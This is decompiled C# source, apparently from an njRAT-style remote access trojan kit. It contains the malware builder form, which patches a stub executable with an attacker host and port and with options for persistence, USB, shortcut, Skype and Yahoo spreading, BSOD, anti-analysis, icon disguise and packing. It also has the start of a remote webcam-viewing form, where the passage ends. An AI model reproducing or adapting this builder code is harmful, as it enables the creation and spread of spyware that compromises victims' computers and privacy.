			this.GroupBox2.ResumeLayout(false);
			this.GroupBox2.PerformLayout();
			((ISupportInitialize)this.PictureBox3).EndInit();
			this.GroupBox5.ResumeLayout(false);
			this.GroupBox5.PerformLayout();
			((ISupportInitialize)this.PictureBox2).EndInit();
			this.GroupBox6.ResumeLayout(false);
			this.GroupBox6.PerformLayout();
			this.GroupBox7.ResumeLayout(false);
			this.GroupBox7.PerformLayout();
			this.TabControl1.ResumeLayout(false);
			this.TabPage1.ResumeLayout(false);
			this.TabPage1.PerformLayout();
			this.GroupBox9.ResumeLayout(false);
			this.GroupBox9.PerformLayout();
			((ISupportInitialize)this.PictureBox1).EndInit();
			this.TabPage2.ResumeLayout(false);
			this.TabPage2.PerformLayout();
			this.TabPage3.ResumeLayout(false);
			this.TabPage4.ResumeLayout(false);
			this.GroupBox4.ResumeLayout(false);
			this.GroupBox4.PerformLayout();
			((ISupportInitialize)this.Num8).EndInit();
			((ISupportInitialize)this.Num7).EndInit();
			((ISupportInitialize)this.Num6).EndInit();
			((ISupportInitialize)this.Num5).EndInit();
			((ISupportInitialize)this.Num4).EndInit();
			((ISupportInitialize)this.Num3).EndInit();
			((ISupportInitialize)this.Num2).EndInit();
			((ISupportInitialize)this.Num1).EndInit();
			this.TabPage8.ResumeLayout(false);
			this.TabPage8.PerformLayout();
			this.GroupBox11.ResumeLayout(false);
			this.GroupBox11.PerformLayout();
			((ISupportInitialize)this.NumericUpDown1).EndInit();
			this.TabPage5.ResumeLayout(false);
			this.TabPage6.ResumeLayout(false);
			this.TabPage7.ResumeLayout(false);
			this.TabPage7.PerformLayout();
			((ISupportInitialize)this.PictureBox4).EndInit();
			this.NyX_Theme1.ResumeLayout(false);
			this.NyX_Theme1.PerformLayout();
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		public Frm_Builder()
		{
			base.Load += new EventHandler(this.Builder_Load);
			Frm_Builder.__ENCAddToList(this);
			base.Load += new EventHandler(this.Builder_Load);
			this.ic = null;
			this.InitializeComponent();
		}

		private void Button1_Click(object sender, EventArgs e)
		{
		}

		private void Builder_Load(object sender, EventArgs e)
		{
			this.dir.SelectedIndex = 0;
			this.host.Text = FN.GTV("host", this.host.Text);
			this.port.Value = Conversions.ToDecimal(FN.GTV("p", Conversions.ToString(this.port.Value)));
			this.exe.Text = FN.GTV("exe", this.exe.Text);
			this.dir.SelectedIndex = Conversions.ToInteger(FN.GTV("dir", Conversions.ToString(this.dir.SelectedIndex)));
			this.VN.Text = FN.GTV("vn", this.VN.Text);
			this.bsod.Checked = Conversions.ToBoolean(FN.GTV("bsod", this.bsod.Checked.ToString()));
			this.startup.Checked = Conversions.ToBoolean(FN.GTV("startup", this.startup.Checked.ToString()));
			this.Spre.Checked = Conversions.ToBoolean(FN.GTV("spread", this.Spre.Checked.ToString()));
			this.reg99.Checked = Conversions.ToBoolean(FN.GTV("reg99", this.reg99.Checked.ToString()));
			this.CH_Infect.Checked = Conversions.ToBoolean(FN.GTV("infect", this.CH_Infect.Checked.ToString()));
			this.CH_p2p.Checked = Conversions.ToBoolean(FN.GTV("yahoo", this.CH_p2p.Checked.ToString()));
			this.CM_Yahoo.Checked = Conversions.ToBoolean(FN.GTV("p2pspread", this.CM_Yahoo.Checked.ToString()));
			this.Anti_CH.Checked = Conversions.ToBoolean(FN.GTV("Anti_CH", this.Anti_CH.Checked.ToString()));
			this.Melt.Checked = Conversions.ToBoolean(FN.GTV("Melt", this.Melt.Checked.ToString()));
			this.ty8.Checked = Conversions.ToBoolean(FN.GTV("ty8", this.ty8.Checked.ToString()));
			this.US.Checked = Conversions.ToBoolean(FN.GTV("us", "FALSE"));
			bool flag = Convert.ToDouble(this.port.Value) != Conversions.ToDouble(FN.GTV("port", Conversions.ToString(this.port.Value)));
			if (flag)
			{
				this.port.Value = Conversions.ToDecimal(FN.GTV("port", Conversions.ToString(this.port.Value)));
			}
			try
			{
				Icon icon = new Icon(FN.GTV("ico", ""));
				this.ic = FN.GTV("ico", "");
				this.PictureBox1.Image = icon.ToBitmap();
				this.CheckBox1.Checked = true;
			}
			catch (Exception expr_365)
			{
				ProjectData.SetProjectError(expr_365);
				Exception projectError = expr_365;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			this.CBIcones.SelectedIndex = 0;
			this.CBTamanhoICO.SelectedIndex = 2;
			this.CM_Obfs.SelectedIndex = 1;
		}

		private void CheckBox1_CheckedChanged_1(object sender, EventArgs e)
		{
		}

		private void reg99_CheckedChanged(object sender, EventArgs e)
		{
		}

		private void dir_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		private void ty8_CheckedChanged(object sender, EventArgs e)
		{
		}

		private void CheckBox2_CheckedChanged(object sender, EventArgs e)
		{
			this.GroupBox2.Enabled = true;
		}

		private void msg7_TextChanged(object sender, EventArgs e)
		{
		}

		private void bsod_CheckedChanged(object sender, EventArgs e)
		{
		}

		private void US_CheckedChanged(object sender, EventArgs e)
		{
		}

		public string RandomVariable(int minamount, int maxamount)
		{
			Random random = new Random();
			string text = null;
			string text2 = "XחLفققמצرقاششقSفHQKKHלفXאחקKאهGمرZKקKرKنUلهرחقهאهמرקLدYهكוقSاPבTپقיاهككQهקYאUپمقTرשكZقשבنغناGاKHهشفشקTבPاJKپاLJUركUSفאشرבهKكחكLلאقافתرفكחJYקهرקLוهپGرهنككKدررنغKJצهPLקבתJUفهקביكלKUرهرUצשفلחلSחه";
			int arg_1D_0 = 1;
			checked
			{
				int num = random.Next(minamount + 1, maxamount);
				int num2 = arg_1D_0;
				while (true)
				{
					int arg_6A_0 = num2;
					int num3 = num;
					if (arg_6A_0 > num3)
					{
						break;
					}
					int index = (int)Math.Round((double)(unchecked(Conversion.Int((float)(checked(text2.Length - 2)) * VBMath.Rnd()) + 1f)));
					text += Conversions.ToString(text2[index]);
					num2++;
				}
				string text3 = "XחLفققמצرقاششقSفHQKKHלفXאחקKאهGمرZKקKرKنUلهرחقهאهמرקLدYهكוقSاPבTپقיاهككQهקYאUپمقTرשكZقשבنغناGاKHهشفشקTבPاJKپاLJUركUSفאشرבهKكחكLلאقافתرفكחJYקهرקLוهپGرهنككKدررنغKJצهPLקבתJUفهקביكלKUرهرUצשفلחلSחه";
				return Conversions.ToString(text3[random.Next(0, text3.Length - 1)]) + text;
			}
		}

		private void Button2_Click(object sender, EventArgs e)
		{
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
		}

		private void CheckBox2_CheckedChanged_1(object sender, EventArgs e)
		{
		}

		private void Spre_CheckedChanged(object sender, EventArgs e)
		{
		}

		public object RDM_NUMBER()
		{
			VBMath.Randomize();
			float num = Conversion.Int(9f * VBMath.Rnd()) + 1f;
			return num;
		}

		private void Button3_Click(object sender, EventArgs e)
		{
		}

		private void CheckBox12_CheckedChanged(object sender, EventArgs e)
		{
		}

		private void host_TextChanged(object sender, EventArgs e)
		{
			this.txt_encription.Text = Convert.ToBase64String(Encoding.ASCII.GetBytes(this.host.Text));
		}

		private void port_ValueChanged(object sender, EventArgs e)
		{
			this.txt_port.Text = Convert.ToBase64String(Encoding.ASCII.GetBytes(Conversions.ToString(this.port.Value)));
		}

		private void Anti_CH_CheckedChanged(object sender, EventArgs e)
		{
		}

		private void NyX_Button1_Click_1(object sender, EventArgs e)
		{
		}

		private void LVIcones_SelectedIndexChanged(object sender, EventArgs e)
		{
			try
			{
				IEnumerator enumerator = this.LVIcones.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					bool flag = File.Exists(listViewItem.SubItems[1].Text);
					if (flag)
					{
						this.ic = listViewItem.SubItems[1].Text;
						this.PictureBox1.Image = Image.FromFile(this.ic);
					}
					else
					{
						Interaction.MsgBox("", MsgBoxStyle.Exclamation, "Information");
						listViewItem.Remove();
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		private void Button1_Click_1(object sender, EventArgs e)
		{
			bool flag = !Directory.Exists(Application.StartupPath + "\\Icones");
			checked
			{
				if (flag)
				{
					Directory.CreateDirectory(Application.StartupPath + "\\Icones");
					Interaction.MsgBox("No existing Icones In Icon's Folder", MsgBoxStyle.Exclamation, "Information");
				}
				else
				{
					string[] array = Strings.Split(this.CBTamanhoICO.Text, ",", -1, CompareMethod.Binary);
					Size imageSize = new Size(Conversions.ToInteger(array[0]), Conversions.ToInteger(array[1]));
					this.IM3.ImageSize = imageSize;
					this.LVIcones.Items.Clear();
					string[] files = Directory.GetFiles(Application.StartupPath + "\\Icones", "*.ico", SearchOption.AllDirectories);
					for (int i = 0; i < files.Length; i++)
					{
						string text = files[i];
						Application.DoEvents();
						Thread.Sleep(10);
						this.IM3.Images.Add(Icon.ExtractAssociatedIcon(text));
						ListViewItem listViewItem = new ListViewItem
						{
							Text = Path.GetFileName(text)
						};
						listViewItem.SubItems.Add(Path.GetFullPath(text));
						listViewItem.ImageIndex = this.IM3.Images.Count - 1;
						this.LVIcones.Items.Add(listViewItem);
					}
					this.lbl_icones.Text = "Icones :" + this.LVIcones.Items.Count.ToString();
				}
			}
		}

		private void CBIcones_SelectedIndexChanged(object sender, EventArgs e)
		{
			bool flag = this.CBIcones.SelectedIndex == 0;
			if (flag)
			{
				this.LVIcones.View = View.LargeIcon;
			}
			else
			{
				flag = (this.CBIcones.SelectedIndex == 1);
				if (flag)
				{
					this.LVIcones.View = View.Details;
				}
				else
				{
					flag = (this.CBIcones.SelectedIndex == 2);
					if (flag)
					{
						this.LVIcones.View = View.SmallIcon;
					}
					else
					{
						flag = (this.CBIcones.SelectedIndex == 3);
						if (flag)
						{
							this.LVIcones.View = View.List;
						}
						else
						{
							flag = (this.CBIcones.SelectedIndex == 4);
							if (flag)
							{
								this.LVIcones.View = View.Tile;
							}
						}
					}
				}
			}
		}

		private void CBTamanhoICO_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		private void CheckBox3_CheckedChanged(object sender, EventArgs e)
		{
			bool @checked = this.CheckBox3.Checked;
			if (@checked)
			{
				this.GroupBox11.Enabled = true;
			}
			else
			{
				this.GroupBox11.Enabled = false;
			}
		}

		private void Rpool_ValueChanged(object sender)
		{
			Application.DoEvents();
			this.txtStringOfuscador.Text = MdFN.StringOfuscador(Convert.ToInt32(this.NumericUpDown1.Value));
		}

		private void sc_CheckedChanged(object sender, EventArgs e)
		{
		}

		private void LinkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Interaction.MsgBox("This Option Made The Server Infect To All Desktop Shortcut", MsgBoxStyle.Information, "Information");
		}

		private void LinkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Interaction.MsgBox("This Option Made The Server Spread To USB Memoiry card...", MsgBoxStyle.Information, "Information");
		}

		private void LinkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Interaction.MsgBox("This Option Made The Server Copies To All Hard Disk\r\nExemple  D:/ , C:/ , USB... ", MsgBoxStyle.Information, "Information");
		}

		private void LinkLabel4_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
		}

		private void LinkLabel5_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Interaction.MsgBox("This Option Made The Server Spread To Victim Skype", MsgBoxStyle.Information, "Information");
		}

		private void LinkLabel6_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Interaction.MsgBox("This Option Made The Server Spread To Victim Yahoo", MsgBoxStyle.Information, "Information");
		}

		private void NyX_Button2_Click(object sender, EventArgs e)
		{
		}

		private void NyX_Button3_Click(object sender, EventArgs e)
		{
			this.PictureBox1.Image = null;
		}

		private void CheckBox1_CheckedChanged(object sender, EventArgs e)
		{
			bool @checked = this.CheckBox1.Checked;
			if (@checked)
			{
				bool flag = this.PictureBox1.Image == null;
				if (flag)
				{
					OpenFileDialog openFileDialog = new OpenFileDialog();
					openFileDialog.Filter = "Icon|*.ico";
					openFileDialog.Title = "Choose Icon";
					openFileDialog.FileName = "";
					flag = (openFileDialog.ShowDialog() == DialogResult.OK);
					if (flag)
					{
						this.ic = openFileDialog.FileName;
						this.PictureBox1.Image = Image.FromFile(this.ic);
					}
				}
			}
			else
			{
				this.PictureBox1.Image = null;
			}
		}

		private void Anti_CH_CheckedChanged_1(object sender, EventArgs e)
		{
			bool @checked = this.Anti_CH.Checked;
			if (@checked)
			{
				this.tree1.Enabled = true;
				this.Tree2.Enabled = true;
				this.Note.Visible = true;
			}
			else
			{
				this.tree1.Enabled = false;
				this.Tree2.Enabled = false;
				this.Note.Visible = false;
			}
		}

		private void Button3_Click_1(object sender, EventArgs e)
		{
			this.TextBox2.Text = this.RandomVariable(20, 35);
			this.TextBox3.Text = this.RandomVariable(15, 35);
			this.TextBox4.Text = this.RandomVariable(20, 35);
			this.TextBox5.Text = this.RandomVariable(30, 40);
			this.TextBox6.Text = this.RandomVariable(35, 50);
			this.Num1.Value = Conversions.ToDecimal(this.RDM_NUMBER());
			this.Num2.Value = Conversions.ToDecimal(this.RDM_NUMBER());
			this.Num3.Value = Conversions.ToDecimal(this.RDM_NUMBER());
			this.Num4.Value = Conversions.ToDecimal(this.RDM_NUMBER());
			this.Num5.Value = Conversions.ToDecimal(this.RDM_NUMBER());
			this.Num6.Value = Conversions.ToDecimal(this.RDM_NUMBER());
			this.Num7.Value = Conversions.ToDecimal(this.RDM_NUMBER());
			this.Num8.Value = Conversions.ToDecimal(this.RDM_NUMBER());
		}

		private void Button2_Click_1(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = "EXE|*.exe";
			saveFileDialog.FileName = "Server";
			bool flag = saveFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				bool flag2 = File.Exists(Application.StartupPath + "\\Stub\\Stub ..exe");
				if (flag2)
				{
					AssemblyDefinition assemblyDefinition = AssemblyDefinition.ReadAssembly(Application.StartupPath + "\\Stub\\Stub ..exe");
					try
					{
						IEnumerator<TypeDefinition> enumerator = assemblyDefinition.MainModule.GetTypes().GetEnumerator();
						while (enumerator.MoveNext())
						{
							TypeDefinition current = enumerator.Current;
							try
							{
								Collection<MethodDefinition>.Enumerator enumerator2 = current.Methods.GetEnumerator();
								while (enumerator2.MoveNext())
								{
									MethodDefinition current2 = enumerator2.Current;
									flag2 = (Operators.CompareString(current2.Name, ".ctor", false) == 0);
									if (flag2)
									{
										IEnumerator<Instruction> enumerator3 = null;
										try
										{
											enumerator3 = (IEnumerator<Instruction>)current2.Body.Instructions.GetEnumerator();
											while (enumerator3.MoveNext())
											{
												Instruction current3 = enumerator3.Current;
												flag2 = (current3.OpCode.Code == Code.Ldstr);
												if (flag2)
												{
													string left = current3.Operand.ToString();
													flag2 = (Operators.CompareString(left, "%vn%", false) == 0);
													if (flag2)
													{
														TextBox vN = this.VN;
														string text = vN.Text;
														vN.Text = text;
														current3.Operand = FN.ENB(ref text);
													}
													else
													{
														flag2 = (Operators.CompareString(left, "%host%", false) == 0);
														if (flag2)
														{
															current3.Operand = this.host.Text;
														}
														else
														{
															flag2 = (Operators.CompareString(left, "%port%", false) == 0);
															if (flag2)
															{
																current3.Operand = this.port.Value.ToString();
															}
															else
															{
																flag2 = (Operators.CompareString(left, "%exe%", false) == 0);
																if (flag2)
																{
																	current3.Operand = this.exe.Text;
																}
																else
																{
																	flag2 = (Operators.CompareString(left, "%bsod%", false) == 0);
																	if (flag2)
																	{
																		current3.Operand = this.bsod.Checked.ToString();
																	}
																	else
																	{
																		flag2 = (Operators.CompareString(left, "%startup%", false) == 0);
																		if (flag2)
																		{
																			current3.Operand = this.startup.Checked.ToString();
																		}
																		else
																		{
																			flag2 = (Operators.CompareString(left, "%spread%", false) == 0);
																			if (flag2)
																			{
																				current3.Operand = this.Spre.Checked.ToString();
																			}
																			else
																			{
																				flag2 = (Operators.CompareString(left, "%reg99%", false) == 0);
																				if (flag2)
																				{
																					current3.Operand = this.reg99.Checked.ToString();
																				}
																				else
																				{
																					flag2 = (Operators.CompareString(left, "%Anti_CH%", false) == 0);
																					if (flag2)
																					{
																						current3.Operand = this.Anti_CH.Checked.ToString();
																					}
																					else
																					{
																						flag2 = (Operators.CompareString(left, "%Melt%", false) == 0);
																						if (flag2)
																						{
																							current3.Operand = this.Melt.Checked.ToString();
																						}
																						else
																						{
																							flag2 = (Operators.CompareString(left, "%infect%", false) == 0);
																							if (flag2)
																							{
																								current3.Operand = this.CH_Infect.Checked.ToString();
																							}
																							else
																							{
																								flag2 = (Operators.CompareString(left, "%p2pspread%", false) == 0);
																								if (flag2)
																								{
																									current3.Operand = this.CH_p2p.Checked.ToString();
																								}
																								else
																								{
																									flag2 = (Operators.CompareString(left, "%yahoo%", false) == 0);
																									if (flag2)
																									{
																										current3.Operand = this.CM_Yahoo.Checked.ToString();
																									}
																									else
																									{
																										flag2 = (Operators.CompareString(left, "%ty8%", false) == 0);
																										if (flag2)
																										{
																											current3.Operand = this.ty8.Checked.ToString();
																										}
																										else
																										{
																											flag2 = (Operators.CompareString(left, "%dir%", false) == 0);
																											if (flag2)
																											{
																												current3.Operand = this.dir.Text.Replace("%", "");
																											}
																											else
																											{
																												flag2 = (Operators.CompareString(left, "%rg%", false) == 0);
																												if (flag2)
																												{
																													current3.Operand = FN.getMD5Hash(this.dir.Text.Replace("%", "") + "\\" + this.exe.Text);
																												}
																												else
																												{
																													flag2 = (Operators.CompareString(left, "%usb%", false) == 0);
																													if (flag2)
																													{
																														current3.Operand = this.US.Checked.ToString();
																													}
																												}
																											}
																										}
																									}
																								}
																							}
																						}
																					}
																				}
																			}
																		}
																	}
																}
															}
														}
													}
												}
											}
										}
										finally
										{
											enumerator3.Dispose();
										}
									}
								}
							}
							finally
							{
								Collection<MethodDefinition>.Enumerator enumerator2;
								((IDisposable)enumerator2).Dispose();
							}
						}
					}
					finally
					{
						IEnumerator<TypeDefinition> enumerator;
						flag2 = (enumerator != null);
						if (flag2)
						{
							enumerator.Dispose();
						}
					}
					assemblyDefinition.Write(saveFileDialog.FileName);
					flag2 = this.CheckBox1.Checked;
					if (flag2)
					{
						Ico.InjectIcon(saveFileDialog.FileName, this.ic);
					}
					FN.STV("host", this.host.Text);
					FN.STV("us", this.US.Checked.ToString());
					FN.STV("p", Conversions.ToString(this.port.Value));
					FN.STV("exe", this.exe.Text);
					FN.STV("dir", Conversions.ToString(this.dir.SelectedIndex));
					FN.STV("vn", this.VN.Text);
					FN.STV("bsod", this.bsod.Checked.ToString());
					FN.STV("startup", this.startup.Checked.ToString());
					FN.STV("spread", this.Spre.Checked.ToString());
					FN.STV("infect", this.CH_Infect.Checked.ToString());
					FN.STV("p2pspread", this.CH_p2p.Checked.ToString());
					FN.STV("yahoo", this.CM_Yahoo.Checked.ToString());
					FN.STV("reg99", this.reg99.Checked.ToString());
					FN.STV("Anti_CH", this.Anti_CH.Checked.ToString());
					FN.STV("Melt", this.Melt.Checked.ToString());
					FN.STV("ty8", this.ty8.Checked.ToString());
					FN.STV("ico", this.ic);
					flag2 = this.rnz.Checked;
					if (flag2)
					{
						this.T1.Visible = true;
						this.T1.Dock = DockStyle.Fill;
						this.T1.BringToFront();
						new MON
						{
							T1 = this.T1
						}.randz(saveFileDialog.FileName);
					}
					flag2 = this.CKUpx.Checked;
					if (flag2)
					{
						Application.DoEvents();
						flag2 = !Directory.Exists(Application.StartupPath + "\\UPX");
						if (flag2)
						{
							Directory.CreateDirectory(Application.StartupPath + "\\UPX");
						}
						Thread.Sleep(50);
						flag2 = !File.Exists(Application.StartupPath + "\\UPX\\mpress.exe");
						if (flag2)
						{
							byte[] mpress = Resources.mpress;
							File.WriteAllBytes(Application.StartupPath + "\\UPX\\mpress.exe", mpress);
						}
						Thread.Sleep(50);
						Interaction.Shell("cmd.exe /C UPX\\mpress.exe -s \"" + saveFileDialog.FileName + "\"", AppWinStyle.NormalFocus, true, -1);
					}
					Interaction.MsgBox("File Builded To\r\n" + saveFileDialog.FileName, MsgBoxStyle.Information, "DONE!");
					this.Close();
				}
				else
				{
					Interaction.MsgBox("No Stub File detected in : " + Application.StartupPath, MsgBoxStyle.OkOnly, null);
				}
			}
		}

		private void NyX_Theme1_Click(object sender, EventArgs e)
		{
		}

		private void CheckBox4_CheckedChanged(object sender, EventArgs e)
		{
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Frm_Cam : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		[AccessedThroughProperty("ComboBox3")]
		private ComboBox _ComboBox3;

		[AccessedThroughProperty("Button3")]
		private Button _Button3;

		[AccessedThroughProperty("CheckBox3")]
		private CheckBox _CheckBox3;

		[AccessedThroughProperty("ComboBox2")]
		private ComboBox _ComboBox2;

		[AccessedThroughProperty("ComboBox1")]
		private ComboBox _ComboBox1;

		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		[AccessedThroughProperty("Panel2")]
		private Panel _Panel2;

		[AccessedThroughProperty("Panel3")]
		private Panel _Panel3;

		[AccessedThroughProperty("Timer2")]
		private Timer _Timer2;

		public string folder;

		public Client osk;

		public string QQ;

		public Client sk;

		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		internal virtual ComboBox ComboBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComboBox3 = value;
			}
		}

		internal virtual Button Button3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Button3 = value;
			}
		}

		internal virtual CheckBox CheckBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CheckBox3_CheckedChanged_1);
				bool flag = this._CheckBox3 != null;
				if (flag)
				{
					this._CheckBox3.CheckedChanged -= value2;
				}
				this._CheckBox3 = value;
				flag = (this._CheckBox3 != null);
				if (flag)
				{
					this._CheckBox3.CheckedChanged += value2;
				}
			}
		}

		internal virtual ComboBox ComboBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComboBox2 = value;
			}
		}

		internal virtual ComboBox ComboBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComboBox1 = value;
			}
		}

		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Button1 = value;
			}
		}

		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox1 = value;
			}
		}

		internal virtual Panel Panel2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel2 = value;
			}
		}

		internal virtual Panel Panel3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel3 = value;
			}
		}

		internal virtual Timer Timer2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer2_Tick);
				bool flag = this._Timer2 != null;
				if (flag)
				{
					this._Timer2.Tick -= value2;
				}
				this._Timer2 = value;
				flag = (this._Timer2 != null);
				if (flag)
				{
					this._Timer2.Tick += value2;
				}
			}
		}

		[DebuggerNonUserCode]
		public Frm_Cam()
		{
			base.FormClosing += new FormClosingEventHandler(this.Cam_FormClosing);
			base.Load += new EventHandler(this.Cam_Load);
			Frm_Cam.__ENCAddToList(this);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Frm_Cam.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Frm_Cam.__ENCList.Count == Frm_Cam.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Frm_Cam.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Frm_Cam.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Frm_Cam.__ENCList[num] = Frm_Cam.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Frm_Cam.__ENCList.RemoveRange(num, Frm_Cam.__ENCList.Count - num);
						Frm_Cam.__ENCList.Capacity = Frm_Cam.__ENCList.Count;
					}
					Frm_Cam.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Frm_Cam));
			this.Timer1 = new Timer(this.components);
			this.ComboBox3 = new ComboBox();
			this.Button3 = new Button();
			this.CheckBox3 = new CheckBox();
			this.ComboBox2 = new ComboBox();
			this.ComboBox1 = new ComboBox();
			this.Button1 = new Button();
			this.Panel1 = new Panel();
			this.ProgressBar1 = new ProgressBar();
			this.PictureBox1 = new PictureBox();
			this.Panel2 = new Panel();
			this.Panel3 = new Panel();
			this.Timer2 = new Timer(this.components);
			this.Panel1.SuspendLayout();
			((ISupportInitialize)this.PictureBox1).BeginInit();
			this.SuspendLayout();
			this.ComboBox3.FormattingEnabled = true;
			Control arg_106_0 = this.ComboBox3;
			Point location = new Point(396, 59);
			arg_106_0.Location = location;
			this.ComboBox3.Name = "ComboBox3";
			Control arg_131_0 = this.ComboBox3;
			Size size = new Size(121, 21);
			arg_131_0.Size = size;
			this.ComboBox3.TabIndex = 2;
			Control arg_157_0 = this.Button3;
			location = new Point(74, 80);
			arg_157_0.Location = location;
			this.Button3.Name = "Button3";
			Control arg_182_0 = this.Button3;
			size = new Size(26, 13);
			arg_182_0.Size = size;
			this.Button3.TabIndex = 1;
			this.Button3.Text = "Start";
			this.Button3.UseVisualStyleBackColor = true;
			this.CheckBox3.AutoSize = true;
			this.CheckBox3.BackColor = Color.Black;
			this.CheckBox3.FlatStyle = FlatStyle.Flat;
			this.CheckBox3.Font = new Font("Segoe UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.CheckBox3.ForeColor = Color.LightSteelBlue;
			Control arg_21F_0 = this.CheckBox3;
			location = new Point(82, 3);
			arg_21F_0.Location = location;
			this.CheckBox3.Name = "CheckBox3";
			Control arg_24A_0 = this.CheckBox3;
			size = new Size(51, 21);
			arg_24A_0.Size = size;
			this.CheckBox3.TabIndex = 1;
			this.CheckBox3.Text = "Save";
			this.CheckBox3.UseVisualStyleBackColor = false;
			this.ComboBox2.BackColor = Color.Black;
			this.ComboBox2.Dock = DockStyle.Right;
			this.ComboBox2.FlatStyle = FlatStyle.Flat;
			this.ComboBox2.ForeColor = Color.LightSteelBlue;
			this.ComboBox2.FormattingEnabled = true;
			this.ComboBox2.Items.AddRange(new object[]
			{
				"640,480",
				"352,288",
				"320,240",
				"220,160",
				"160,120"
			});
			Control arg_326_0 = this.ComboBox2;
			location = new Point(257, 0);
			arg_326_0.Location = location;
			this.ComboBox2.Name = "ComboBox2";
